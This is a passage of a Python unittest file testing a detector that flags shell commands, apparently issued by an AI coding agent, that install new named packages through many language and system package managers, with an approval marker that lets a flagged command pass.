import json
import pathlib
import shlex
import sys
import unittest

PLANKA_DIR = pathlib.Path(__file__).resolve().parent.parent / "plugin" / "planka"
sys.path.insert(0, str(PLANKA_DIR))
import depcheck  # noqa: E402
from tests.helpers import assert_linear  # noqa: E402

# Корпус команд Bash: source — transcript (команды из транскриптов Claude Code автора в этом проекте, санитизированы:
# без секретов, адресов, хостов и чужих проектов, домашний каталог — /home/user) или edge (образец края разбора);
# expect — add (dependency_add), doubt (dependency_doubt) или pass.
CORPUS = pathlib.Path(__file__).parent / "fixtures" / "bash-commands.jsonl"


class DependencyAddTest(unittest.TestCase):
    def test_adds_detected(self):
        for cmd in [
            "go get github.com/x/y@v1",
            "npm install left-pad",
            "npm i -D typescript",
            "npm add lodash",
            "pnpm add react",
            "yarn add react",
            "pip install requests",
            "pip3 install --upgrade requests",
            "python -m pip install requests",
            "python3 -m pip install requests",
            "uv add httpx",
            "uv pip install httpx",
            "poetry add httpx",
            "cargo add serde",
            "gem install rails",
            "bundle add rails",
            "composer require monolog/monolog",
            "sudo npm install -g pnpm",
            "CI=1 npm install left-pad",
            "cd app && npm install left-pad",
            "make build; pip install requests",
            "echo x | npm install left-pad",
        ]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)

    def test_returns_offending_segment(self):
        self.assertEqual(depcheck.dependency_add("cd app && npm install left-pad"), "npm install left-pad")

    def test_not_adds(self):
        for cmd in [
            "npm ci",
            "npm install",
            "npm install --frozen-lockfile",
            "pnpm install",
            "pip install -r requirements.txt",
            "pip install --requirement requirements.txt",
            "pip install -e .",
            "pip install .",
            "pip install ./pkg",
            "pip install /abs/pkg",
            "go get",
            "gem list",
            "echo 'npm install left-pad'",
            "",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)

    def test_marker_passes(self):
        self.assertIsNone(depcheck.dependency_add("PLANKA_DEP_OK=1 npm install left-pad"))
        self.assertIsNone(depcheck.dependency_add("cd app && PLANKA_DEP_OK=1 npm install left-pad"))

    def test_unclosed_quote_does_not_raise(self):
        self.assertIsNotNone(depcheck.dependency_add("npm install left-pad 'oops"))
        self.assertIsNone(depcheck.dependency_add("echo 'oops"))

    def test_non_string(self):
        self.assertIsNone(depcheck.dependency_add(None))
        self.assertIsNone(depcheck.dependency_add(5))


class LongTokenTest(unittest.TestCase):
    def test_megabyte_token_returns(self):
        self.assertIsNone(depcheck.dependency_add("x" * 1_000_000))

    def test_add_before_megabyte_token_detected(self):
        self.assertIsNotNone(depcheck.dependency_add("npm install left-pad " + "x" * 1_000_000))


class HeredocTest(unittest.TestCase):
    def test_body_not_scanned(self):
        for cmd in [
            "cat <<'EOF' > README.md\n# Установка\n\npip install mypkg\nEOF",
            'git commit -m "$(cat <<\'EOF\'\nfix: deps\n\nnpm install x\nEOF\n)"',
            "cat <<-EOF\n\tnpm install x\n\tEOF",
            'cat <<"EOF"\npip install y\nEOF',
            "cat << EOF\npip install y\nEOF",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)

    def test_command_after_body_detected(self):
        for opener, terminator in [("<<EOF", "EOF"), ("<<'EOF'", "EOF"), ('<<"EOF"', "EOF"), ("<<\\EOF", "EOF"),
                                   ("<<E'O'F", "EOF"), ("<<-EOF", "\t\tEOF")]:
            cmd = f"cat {opener}\n\tnpm install x\n{terminator}\nnpm install y"
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), "npm install y")

    def test_introducing_line_checked(self):
        self.assertIsNotNone(depcheck.dependency_add("npm install x <<EOF\nhi\nEOF"))

    def test_quoted_operator_is_not_heredoc(self):
        for cmd in ['echo "a <<b"\nnpm install x', "echo 'a <<b'\nnpm install x",
                    "cat <<< EOF\nnpm install x", "echo $((1 << 2))\nnpm install x",
                    "echo $(( (1 << 2) ))\nnpm install x", "(( x <<= 1 ))\nnpm install x",
                    "echo hi # <<EOF\nnpm install x"]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)

    def test_two_heredocs_on_one_line(self):
        self.assertIsNone(depcheck.dependency_add("cat <<A <<B\npip install x\nA\npip install y\nB"))
        self.assertIsNotNone(depcheck.dependency_add("cat <<A <<B\nA\nB\npip install z"))


class PipBootstrapAndArchivesTest(unittest.TestCase):
    def test_not_adds(self):
        for cmd in [
            "pip install --upgrade pip",
            "python -m pip install --upgrade pip setuptools wheel",
            "uv pip install -U pip",
            "pip install pip==24.0",
            'pip install -U "pip>=24"',
            'python -m pip install "pip>=24" "setuptools>=70" wheel',
            "pip install dist/x.whl",
            "pip install dist/x-1.0.tar.gz",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)

    def test_still_detected(self):
        for cmd in [
            "pip install --upgrade pip requests",
            'pip install "requests>=2"',
            "pip install pip==24.0 requests",
            "pip install dist/x.whl requests",
        ]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)


class NoNamedPackageTest(unittest.TestCase):
    def test_not_adds(self):
        for cmd in [
            "pip install -e .[dev]",
            "npm install # temp",
            "npm install  # reinstall deps",
            "npm install --prefix app",
            "pnpm install --filter app",
            "pip install -c constraints.txt",
            "uv add -r r.txt",
            "npm install ../other",
            "npm install ~/pkg",
            "npm install file:../x",
            'pip install ""',
            "npm install --prefix app  # note",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)

    def test_still_detected(self):
        for cmd in [
            "npm install --prefix app left-pad",
            "pip install -c c.txt requests",
            "npm install left-pad # temp",
            "uv add -r r.txt httpx",
        ]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)


class ManagerFlagsAndCommentsTest(unittest.TestCase):
    def test_detected(self):
        for cmd in [
            "pnpm add -w left-pad",
            "npm install -w packages/a left-pad",
            "cargo add -v serde",
            "gem install -v 1.0 rails",
            "echo '#' ; npm install x",
            "npm install x # c\npip install y",
            'echo "a # b" && npm install x',
        ]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)

    def test_not_adds(self):
        for cmd in [
            "npm install -w packages/a",
            "gem install -v 1.0",
            "echo hi # a; npm install x",
            "echo hi # a && npm install x",
            "echo hi # a | npm install x",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)


class QuotedSeparatorsTest(unittest.TestCase):
    def test_separators_inside_quotes_are_text(self):
        for cmd in [
            'git commit -m "docs; pip install requests"',
            'echo "a && npm install x"',
            "echo 'a | npm install x'",
            'git commit -m "first line\n\npip install requests\n"',
            "echo 'one\ntwo; npm install x'",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)

    def test_add_after_closed_quote_detected(self):
        for cmd in [
            'git commit -m "a; b" && pip install requests',
            'echo "multi\nline"; npm install x',
            "npm install \\\n  left-pad",
        ]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)


class ShellFormsTest(unittest.TestCase):
    def test_detected(self):
        for cmd in [
            "sleep 1 & npm install lodash",
            "(npm install lodash)",
            "x=$(npm install lodash)",
            "if true; then npm install lodash; fi",
            "for x in a; do npm install lodash; done",
            "! npm install lodash",
            "{ npm install lodash; }",
            "time npm install lodash",
            "env A=1 npm install lodash",
            "sudo -E pip install requests",
            "sudo -u bob npm install lodash",
            "bash <<EOF\nnpm install lodash\nEOF",
            "ssh h <<EOF\npip install x\nEOF",
            "pip install -r req.txt requests",
            "pnpm -C sub add lodash",
            "npm --save install lodash",
            "npm -w pkg install lodash",
            "pip3.11 install requests",
        ]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)

    def test_not_adds(self):
        for cmd in [
            "make test 2>&1 | tail -3",
            "cmd &> log",
            "echo $((1 + 2))",
            "cat <<EOF > notes.md\nnpm install x\nEOF",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)


class MarkerScopeTest(unittest.TestCase):
    def test_marker_only_in_own_segment(self):
        for cmd in [
            "npm install lodash # PLANKA_DEP_OK=1",
            "echo PLANKA_DEP_OK=1; npm install lodash",
            "PLANKA_DEP_OK=1 npm install a && npm install b",
        ]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)
        self.assertIsNone(depcheck.dependency_add("CI=1 PLANKA_DEP_OK=1 npm install lodash"))


class RedirectionTest(unittest.TestCase):
    def test_redirections_are_not_packages(self):
        for cmd in [
            "npm install 2>/dev/null",
            "pip install -r requirements.txt 2>&1 | tail -5",
            "go get -u ./... 2>/dev/null",
            "npm install >log",
            "npm install > log",
            "npm install &>/dev/null",
            "npm install < /dev/null",
            "npm install >> log 2>&1",
            "2>/dev/null npm install",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)

    def test_package_beside_redirection_detected(self):
        for cmd in ["npm install left-pad 2>/dev/null", "pip install requests > log", "npm install > log left-pad"]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)


class ValueFlagsTest(unittest.TestCase):
    def test_flag_values_are_not_packages(self):
        for cmd in [
            "pip install --timeout 60 -r r.txt",
            "pip install --retries 3 --trusted-host h --upgrade-strategy eager -r r.txt",
            "pip install --only-binary :all: --no-binary none --cache-dir /c -r r.txt",
            "pip install --log l.txt --src s --proxy p --progress-bar off -r r.txt",
            "pip install --config-settings k=v --report r.json -r r.txt",
            "npm install --omit dev",
            "npm install --include peer --loglevel warn --before 2024-01-01",
            "npm install --install-strategy nested --audit-level high",
            "pnpm install -F app",
            "pnpm install --reporter silent",
            "uv pip install --python 3.12 -r r.txt",
            "uv pip install -p 3.12 -r r.txt",
            "uv add --script s.py -r r.txt",
            "cargo add -F derive",
            "cargo add -p crate",
            "cargo add --manifest-path sub/Cargo.toml",
            "composer require --working-dir sub",
            "composer require -d sub",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)

    def test_global_flags_before_subcommand(self):
        for cmd in [
            "npm --loglevel warn install x",
            "pnpm --reporter silent add x",
            "uv --directory sub add x",
            "composer -d sub require x",
            "poetry -C sub add x",
        ]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)
        self.assertIsNone(depcheck.dependency_add("npm --loglevel warn install"))

    def test_package_after_value_flag_detected(self):
        for cmd in ["pip install --timeout 60 requests", "cargo add -F derive serde", "npm install --omit dev x"]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)


class HashInsideWordTest(unittest.TestCase):
    def test_hash_inside_word_is_not_comment(self):
        # `#` внутри слова, принятый за комментарий, обрезал бы пакет за ним.
        for cmd in ["X=a#b npm install lodash", "npm install ./a#b left-pad"]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)


class LocalityTest(unittest.TestCase):
    def test_url_is_package(self):
        for cmd in ["pip install https://e.com/p.tar.gz", "pip install git+https://h/r.git",
                    "npm install https://e.com/x.tgz"]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)

    def test_local_paths_and_archives(self):
        for cmd in ["pip install pkg/", "pip install sub/dir", "pip install dist/x.zip", "npm install x.tgz",
                    "gem install x.gem", "npm install file:///abs/x", "npm install .lodash"]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)

    def test_npm_slash_is_github_package(self):
        self.assertIsNotNone(depcheck.dependency_add("npm install user/repo"))


class WrappersTest(unittest.TestCase):
    def test_wrapped_install_detected(self):
        for cmd in [
            "timeout 60 npm install x",
            "timeout -s KILL 60 npm install x",
            "nice npm install x",
            "nice -n 5 npm install x",
            "env -i npm install x",
            "env -u HOME A=1 npm install x",
            "time -p npm install x",
            "nohup npm install x",
            ".venv/bin/pip install requests",
            ".venv/bin/python -m pip install x",
            "/usr/bin/npm install x",
            "yarn workspace app add x",
            "echo `npm install left-pad`",
        ]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)

    def test_wrapped_non_install(self):
        for cmd in ["timeout 60 npm install", "yarn workspace app add", "command -v npm", "echo '`npm install x`'"]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)


class MarkerParsingTest(unittest.TestCase):
    def test_marker_among_parsed_assignments(self):
        for cmd in [
            "FOO='a b' PLANKA_DEP_OK=1 npm install x",
            "if PLANKA_DEP_OK=1 npm install x; then :; fi",
            "sudo PLANKA_DEP_OK=1 npm install x",
            "env PLANKA_DEP_OK=1 npm install x",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)

    def test_quoted_marker_does_not_count(self):
        for cmd in ['A="x PLANKA_DEP_OK=1 y" npm install x', "npm install PLANKA_DEP_OK=1 x"]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)


class ShellEdgeCasesTest(unittest.TestCase):
    def test_ansi_c_quote_with_escaped_quote(self):
        self.assertIsNone(depcheck.dependency_add("echo $'it\\'s; npm install x'"))
        self.assertIsNotNone(depcheck.dependency_add("echo $'it\\'s'; npm install x"))

    def test_heredoc_after_line_continuation(self):
        self.assertIsNone(depcheck.dependency_add("cat <<EOF \\\n  > out.txt\nnpm install x\nEOF"))
        self.assertIsNotNone(depcheck.dependency_add("cat <<EOF \\\n  > out.txt\nhi\nEOF\nnpm install y"))

    def test_heredoc_to_script_is_data(self):
        for cmd in ["bash script.sh <<EOF\nnpm install x\nEOF", "bash -c cat <<EOF\nnpm install x\nEOF",
                    "ssh h cat <<EOF\nnpm install x\nEOF"]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)
        for cmd in ["bash -s <<EOF\nnpm install x\nEOF", "cat <<EOF | bash\nnpm install x\nEOF"]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)


class GluedFlagsTest(unittest.TestCase):
    def test_glued_shell_flag_with_value_runs_heredoc(self):
        for cmd in ["bash -euo pipefail <<'EOF'\nnpm install leftpad\nEOF",
                    "bash +eo pipefail <<EOF\nnpm install leftpad\nEOF",
                    "bash --rcfile x <<EOF\nnpm install leftpad\nEOF"]:
            self.assertEqual(depcheck.dependency_add(cmd), "npm install leftpad", cmd)
        self.assertIsNone(depcheck.dependency_add("bash -eo pipefail script.sh <<EOF\nnpm install x\nEOF"))

    def test_ssh_flag_value_is_not_remote_command(self):
        for cmd in ["ssh -i key host <<EOF\nnpm install leftpad\nEOF",
                    "ssh -p 22 host <<EOF\nnpm install leftpad\nEOF",
                    "ssh -vi key -o BatchMode=yes host <<EOF\nnpm install leftpad\nEOF"]:
            self.assertEqual(depcheck.dependency_add(cmd), "npm install leftpad", cmd)
        for cmd in ["ssh -i key host cat <<EOF\nnpm install x\nEOF",
                    "ssh host ./run.sh <<EOF\nnpm install x\nEOF"]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)

    def test_glued_short_flags_ending_in_value_flag(self):
        for cmd in ["pip install -qr requirements.txt", "pip install -Ur requirements.txt",
                    "uv pip install -qr r.txt", "pnpm -wC sub add"]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)
        for cmd in ["pip install -qr r.txt requests", "pip install -qU requests", "sudo -Eu root npm install x",
                    "pnpm -wC sub add x"]:
            self.assertEqual(depcheck.dependency_add(cmd), cmd, cmd)


class LanguageManagersTest(unittest.TestCase):
    def test_detected(self):
        for cmd in [
            "bun add zod",
            "bun add -d @types/node",
            "bun i lodash",
            "bun install lodash",
            "bun --cwd sub add x",
            "deno add npm:chalk",
            "deno add jsr:@std/path",
            "deno add @std/path",
            "deno install npm:chalk",
            "deno install --check npm:chalk",
            "pipx inject myenv requests",
            "conda install numpy",
            "conda install -n env -c conda-forge numpy",
            "mamba install -y pandas",
            "micromamba install -n base xtensor",
            "pipenv install requests",
            "pipenv install --dev pytest",
            "dotnet add package Newtonsoft.Json",
            "dotnet add src/App.csproj package Serilog --version 3.0.0",
            "dotnet package add Serilog",
            "dotnet tool install dotnet-ef",
            "dart pub add http",
            "flutter pub add provider",
            "flutter pub add dev:build_runner",
            "swift package add-dependency https://github.com/apple/swift-argument-parser --from 1.0.0",
            "cargo add --git https://github.com/x/y",
            "npm it lodash",
            "pip install -e git+https://h/r.git#egg=x",
            "poetry self add poetry-plugin-export",
        ]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)

    def test_not_adds(self):
        for cmd in [
            "bun install",
            "bun i",
            "bun install --frozen-lockfile",
            "bun install --filter './packages/*'",
            "bun run build",
            "bun test",
            "deno install",
            "deno install --entrypoint main.ts",
            "deno install -e main.ts",
            "deno install -g ./cli.ts",
            "deno task dev",
            "pipx list",
            "pipx install .",
            "pipx inject myenv",
            "pipx inject myenv ./local",
            "conda install --file environment.yml",
            "conda install --revision 3",
            "micromamba install -y -f env.yml",
            "pipenv install",
            "pipenv install --deploy --system",
            "pipenv install -r requirements.txt",
            "pipenv install -e .",
            "pipenv sync",
            "dotnet build",
            "dotnet restore",
            "dotnet add reference ../Lib/Lib.csproj",
            "dotnet add src/App.csproj reference ../Lib/Lib.csproj",
            "dotnet tool restore",
            "dotnet tool run dotnet-ef",
            "dart pub get",
            "flutter pub get",
            "swift build",
            "swift package resolve",
            "swift package add-dependency ../LocalPkg",
            "pip install -e mypkg",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)


class GlobalInstallTest(unittest.TestCase):
    """Глобальная установка — тоже новый пакет в системе агента: postinstall и код исполняются с его
    правами."""

    def test_detected(self):
        for cmd in [
            "npm install -g pnpm",
            "npm install --global pnpm",
            "bun add -g typescript",
            "deno install -g -A jsr:@x/cli",
            "deno install -g -n tool https://deno.land/x/t/cli.ts",
            "pipx install black",
            "pipx install --python 3.12 black",
            "uv tool install ruff",
            "cargo install ripgrep",
            "cargo install --git https://github.com/x/y",
            "go install golang.org/x/tools/gopls@latest",
            "yarn global add serve",
            "composer global require laravel/installer",
            "dotnet tool install -g dotnet-ef",
            "dart pub global activate very_good_cli",
        ]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)

    def test_local_builds_not_adds(self):
        for cmd in ["cargo install --path .", "cargo install --locked --path crates/x", "cargo install --list",
                    "go install ./...", "go install ./cmd/tool", "go install", "go install -tags netgo ./cmd/x",
                    "uv tool install --editable ."]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)


class OneOffRunTest(unittest.TestCase):
    """Разовый запуск без установки (`npx`, `uvx`, `pipx run`, `go run` и подобные) — не добавление пакета."""

    def test_not_adds(self):
        for cmd in ["npx create-react-app app", "npx -y tsc --noEmit", "bunx create-next-app", "bun x cowsay",
                    "pnpm dlx create-vite", "yarn dlx create-vite", "npm exec -- eslint .", "uvx ruff check",
                    "uv tool run ruff", "pipx run black .", "deno run npm:cowsay hi",
                    "go run golang.org/x/tools/cmd/stringer@latest", "uv run --with requests script.py"]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)


class NestedCommandTest(unittest.TestCase):
    def test_detected(self):
        for cmd in [
            "sh -c 'npm install x'",
            'bash -c "cd app && npm install x"',
            "bash -lc 'pip install requests'",
            "bash -euo pipefail -c 'pip install requests'",
            "sudo sh -c 'npm i -g x'",
            "eval 'npm install x'",
            "eval npm install x",
            "xargs npm install x",
            "echo a | xargs -n 1 npm install x",
            "xargs -I {} npm install {}",
            "xargs sh -c 'npm install \"$0\"'",
            "stdbuf -oL npm install x",
            "stdbuf -o L npm install x",
            "env -S 'npm install x'",
            'env -S"npm install x"',
            "env --split-string='pip install requests'",
            "npm.cmd install x",
            "pip.exe install requests",
            "C:/node/npm.cmd install x",
            "py -m pip install requests",
            "py -3.11 -m pip install requests",
            "python -I -m pip install requests",
            "python -m pipx install black",
            "uv run pip install requests",
            "uv run -- pip install requests",
            "poetry run pip install x",
            "pipenv run pip install x",
            "conda run -n env pip install x",
        ]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)

    def test_returns_outer_segment(self):
        self.assertEqual(depcheck.dependency_add("make && bash -c 'npm install x'"), "bash -c 'npm install x'")

    def test_not_adds(self):
        for cmd in [
            "sh -c 'echo hi'",
            'bash -c "make test"',
            "bash -c 'npm install'",
            "bash script.sh 'npm install x'",
            'eval "$(ssh-agent -s)"',
            "xargs grep foo",
            "find . -name '*.py' | xargs wc -l",
            "stdbuf -oL make test",
            "env -S 'make test'",
            "npm.cmd run build",
            "py -m pytest",
            "py script.py",
            "python -c 'import pip'",
            "python -m venv .venv",
            "uv run pytest",
            "uv run -m pytest",
            "poetry run pytest",
            "pipenv run pytest",
            "conda run -n env pytest",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)

    def test_marker(self):
        for cmd in ["PLANKA_DEP_OK=1 bash -c 'npm install x'", "bash -c 'PLANKA_DEP_OK=1 npm install x'",
                    "PLANKA_DEP_OK=1 eval 'npm install x'"]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)
        # Подстановка исполняется до команды сегмента: маркер команды её не покрывает.
        self.assertIsNotNone(depcheck.dependency_add('PLANKA_DEP_OK=1 echo "$(npm install x)"'))

    def test_depth_limited(self):
        self.assertIsNone(depcheck.dependency_add("eval " * 50 + "npm install x"))
        self.assertIsNone(depcheck.dependency_add("bash -c '" * 1000 + "npm install x"))


class QuotedSubstitutionTest(unittest.TestCase):
    def test_detected(self):
        for cmd in [
            'echo "$(npm install x)"',
            'echo "`npm install x`"',
            'git commit -m "msg $(pip install requests)"',
            "bash -c 'echo \"$(npm install x)\"'",
        ]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)

    def test_not_adds(self):
        for cmd in [
            'echo "$(git rev-parse HEAD)"',
            'echo "$((1+2))"',
            "echo '$(npm install x)'",
            'echo "\\$(npm install x)"',
            'git commit -m "docs: \\`npm install x\\` in README"',
            "git commit -m \"$(cat <<'EOF'\nfix\n\nnpm install x\nEOF\n)\"",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)


class PipNamedFileTest(unittest.TestCase):
    def test_named_local_file_not_adds(self):
        for cmd in ["pip install name@file:///x", 'pip install "name @ file:///abs/x"',
                    "pip install name @ file:///abs/x"]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)

    def test_named_url_detected(self):
        for cmd in ["pip install name@https://e.com/x.whl", "pip install name @ https://e.com/x.whl",
                    "pip install name@file:///x requests"]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)


class QuotedRedirectTest(unittest.TestCase):
    def test_quoted_operator_is_word(self):
        # Без кавычек `>` с целью `x` выбрасывается; в кавычках это аргумент, `x` — пакет.
        self.assertIsNone(depcheck.dependency_add("npm install > x"))
        self.assertIsNotNone(depcheck.dependency_add('npm install ">" x'))
        self.assertIsNotNone(depcheck.dependency_add("npm install '2>' x"))
        self.assertIsNotNone(depcheck.dependency_add("npm install \\> x"))

    def test_quoted_target_still_redirect(self):
        self.assertIsNone(depcheck.dependency_add('npm install 2>"err log"'))
        self.assertIsNone(depcheck.dependency_add('npm install > "out log"'))


class BooleanFlagTest(unittest.TestCase):
    def test_pnpm_workspace_root_has_no_value(self):
        self.assertIsNotNone(depcheck.dependency_add("pnpm add --workspace-root x"))


class SystemManagersTest(unittest.TestCase):
    """Системный пакет тоже исполняется с правами агента: установка с названным пакетом — вопрос автору."""

    def test_detected(self):
        for cmd in [
            "apt install jq",
            "sudo apt install -y ripgrep",
            "apt-get install -y --no-install-recommends build-essential",
            "sudo apt-get -y install jq",
            "apt-get -o Dpkg::Options::=--force-confnew install jq",
            "apt-get install -t bookworm-backports golang",
            "apt-get install -yqq curl",
            "apt install foo/bookworm-backports",
            "DEBIAN_FRONTEND=noninteractive apt-get install -y tzdata",
            "aptitude install htop",
            "brew install jq",
            "brew install --cask firefox",
            "brew install --formula wget",
            "brew install user/tap/formula",
            "brew cask install firefox",
            "HOMEBREW_NO_AUTO_UPDATE=1 brew install jq",
            "dnf install -y gcc",
            "sudo dnf --enablerepo epel install htop",
            "dnf install --repo fedora gcc",
            "dnf -y group install 'Development Tools'",
            "yum install -y git",
            "yum groupinstall 'Development Tools'",
            "microdnf install jq",
            "pacman -S jq",
            "sudo pacman -Sy --noconfirm jq",
            "pacman -Syu jq",
            "pacman -S --needed base-devel git",
            "pacman --config /etc/p.conf -S jq",
            "pacman -U https://e.com/x-1.0-1-x86_64.pkg.tar.zst",
            "yay -S visual-studio-code-bin",
            "apk add curl",
            "apk add --no-cache curl",
            "apk add --virtual .build-deps gcc musl-dev",
            "apk -U add curl",
            "zypper install git",
            "zypper in -y git",
            "zypper --non-interactive install git",
            "zypper -n in -t pattern devel_basis",
            "choco install git -y",
            "choco install nodejs --version 20.0.0",
            "choco.exe install git",
            "winget install vscode",
            "winget install --id Git.Git -e",
            "winget install -e --id Microsoft.PowerShell --source winget",
            "winget add jq",
            "scoop install git",
            "scoop install extras/vscode",
            "scoop install -a 64bit git",
            "sudo port install wget",
            "port -N install wget +universal",
            "snap install jq",
            "sudo snap install code --classic",
            "snap install --channel edge lxd",
            "flatpak install flathub org.gimp.GIMP",
            "flatpak install --user -y flathub org.gimp.GIMP",
            "flatpak install https://dl.flathub.org/repo/appstream/org.gimp.GIMP.flatpakref",
            "nix-env -i hello",
            "nix-env -iA nixpkgs.hello",
            "nix-env --install -A nixpkgs.hello",
            "nix-env -f '<nixpkgs>' -iA hello",
            "nix profile install nixpkgs#hello",
            "nix profile add nixpkgs#hello",
            "nix --extra-experimental-features 'nix-command flakes' profile install nixpkgs#hello",
            "nix profile install github:owner/repo#tool",
        ]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)

    def test_not_adds(self):
        for cmd in [
            "apt-get update",
            "sudo apt-get update && sudo apt-get upgrade -y",
            "apt upgrade",
            "apt list --installed",
            "apt search jq",
            "apt show jq",
            "apt-cache search jq",
            "apt remove jq",
            "apt-get purge -y jq",
            "apt-get autoremove -y",
            "apt-get install",
            "apt-get -f install",
            "apt install ./pkg.deb",
            "apt install /tmp/x.deb",
            "apt-get install -o Dpkg::Options::=--force-confnew",
            "apt-get install -t bookworm-backports",
            "dpkg -i x.deb",
            "brew update",
            "brew upgrade",
            "brew upgrade jq",
            "brew list",
            "brew search jq",
            "brew info jq",
            "brew uninstall jq",
            "brew tap",
            "brew tap homebrew/cask-fonts",
            "brew bundle",
            "brew bundle install",
            "brew doctor",
            "brew install",
            "brew install ./Formula/x.rb",
            "brew install --cc gcc-14",
            "brew install --env std",
            "brew install --bottle-arch x86-64",
            "dnf upgrade",
            "dnf upgrade --refresh",
            "dnf check-update",
            "dnf search gcc",
            "dnf info gcc",
            "dnf list installed",
            "dnf remove gcc",
            "dnf install ./x.rpm",
            "dnf install --repo fedora",
            "yum update -y",
            "yum localinstall x.rpm",
            "pacman -Syu",
            "sudo pacman -Syu --noconfirm",
            "pacman -Sy",
            "pacman -Ss jq",
            "pacman -Si jq",
            "pacman -Sl",
            "pacman -Sg base-devel",
            "pacman -Sc",
            "pacman -Scc",
            "pacman -Sw jq",
            "pacman -Sp jq",
            "pacman -S --search jq",
            "pacman -Q",
            "pacman -Qi jq",
            "pacman -R jq",
            "pacman -Rns jq",
            "pacman -U ./x.pkg.tar.zst",
            "pacman -U /var/cache/pacman/pkg/x-1.0-1-x86_64.pkg.tar.zst",
            "pacman -r /mnt -Syu",
            "yay",
            "yay -Syu",
            "apk update",
            "apk upgrade",
            "apk info",
            "apk search curl",
            "apk del curl",
            "apk add",
            "apk add --allow-untrusted ./x.apk",
            "apk add --virtual .build-deps",
            "zypper refresh",
            "zypper up",
            "zypper dup",
            "zypper search git",
            "zypper rm git",
            "zypper install ./x.rpm",
            "choco upgrade all -y",
            "choco list",
            "choco search git",
            "choco uninstall git",
            "choco install packages.config",
            "choco install --version 1.0",
            "winget upgrade --all",
            "winget list",
            "winget search vscode",
            "winget show vscode",
            "winget uninstall vscode",
            "winget install -m ./manifest.yaml",
            "winget install --manifest ./manifests/x",
            "winget import -i packages.json",
            "scoop update",
            "scoop update *",
            "scoop list",
            "scoop search git",
            "scoop bucket add extras",
            "scoop install ./app.json",
            "port selfupdate",
            "port upgrade outdated",
            "port installed",
            "port search wget",
            "port install",
            "snap refresh",
            "snap list",
            "snap find jq",
            "snap remove jq",
            "snap install ./x.snap --dangerous",
            "flatpak update",
            "flatpak list",
            "flatpak search gimp",
            "flatpak uninstall org.gimp.GIMP",
            "flatpak install --bundle x.flatpak",
            "flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo",
            "nix-env -u",
            "nix-env -q",
            "nix-env -qa hello",
            "nix-env -e hello",
            "nix-env -if ./default.nix",
            "nix-env -i -f default.nix",
            "nix-env -i ./result",
            "nix profile upgrade --all",
            "nix profile list",
            "nix profile remove hello",
            "nix profile install .#tool",
            "nix profile install path:/home/u/flake",
            "nix profile install --expr 'import ./x.nix'",
            "nix build",
            "nix build .#pkg",
            "nix develop",
            "nix run nixpkgs#hello",
            "nix-shell -p hello",
            "nix flake update",
            "nix --option substituters https://cache install",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)

    def test_marker(self):
        for cmd in ["PLANKA_DEP_OK=1 apt-get install -y jq", "sudo PLANKA_DEP_OK=1 brew install jq"]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)


class RareLanguageManagersTest(unittest.TestCase):
    def test_detected(self):
        for cmd in [
            "pdm add requests",
            "pdm add -d pytest",
            "pdm add -G test pytest",
            "pdm add -e git+https://github.com/x/y.git#egg=y",
            "pdm self add pdm-plugin",
            "pdm run pip install x",
            "rye add httpx",
            "rye add --dev pytest",
            "rye add flask --git https://github.com/pallets/flask",
            "rye install black",
            "rye tools install black",
            "pixi add numpy",
            "pixi add --pypi requests",
            "pixi add --feature test pytest",
            "pixi add --manifest-path sub/pixi.toml numpy",
            "pixi global install ripgrep",
            "pixi global add --environment tools bat",
            "mix archive.install hex phx_new",
            "mix archive.install github hexpm/hex",
            "mix archive.install https://e.com/x.ez",
            "mix escript.install hex livebook",
            "cabal install pandoc",
            "cabal install --lib aeson",
            "cabal v2-install hlint",
            "stack install hlint",
            "stack --resolver lts-22.0 install pandoc",
            "opam install dune",
            "opam install -y dune merlin",
